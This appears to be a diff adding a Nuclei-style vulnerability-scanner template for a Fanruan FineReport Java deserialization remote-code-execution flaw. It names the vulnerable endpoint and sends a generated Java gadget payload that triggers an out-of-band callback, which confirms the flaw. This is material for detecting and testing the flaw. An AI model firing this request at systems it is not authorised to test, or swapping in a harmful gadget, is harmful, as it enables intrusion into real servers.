@@ -1,0 +1,22 @@
+id: fanruan-deserialization
+
+info:
+  name: Fanruan Deserialization - Remote Code Execution
+  author: fanruan
+  severity: critical
+  tags: finereport,rce
+
+http:
+  - raw:
+      - |
+        POST /decision/remote/design/channel HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{generate_java_gadget("dns", "http://{{interactsh-url}}", "gzip")}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
